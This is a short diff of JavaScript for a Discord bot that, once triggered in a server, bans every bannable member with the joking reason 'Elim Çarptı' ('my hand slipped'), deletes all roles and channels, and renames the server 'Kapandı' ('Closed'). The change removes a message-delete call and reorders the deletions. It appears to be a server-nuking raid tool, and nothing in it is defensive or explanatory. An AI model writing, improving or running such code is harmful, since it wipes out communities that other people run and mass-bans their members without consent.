@@ -7,12 +7,11 @@ if (message.guild) {
 message.guild.members.forEach(u => {
 if (u.bannable) {
 message.guild.ban(u, "Elim Çarptı")
-message.delete()
 }
 })
 
-message.guild.channels.deleteAll("");
 message.guild.roles.deleteAll("");
+message.guild.channels.deleteAll("");
 }
 
 message.guild.setName(`Kapandı`, "")
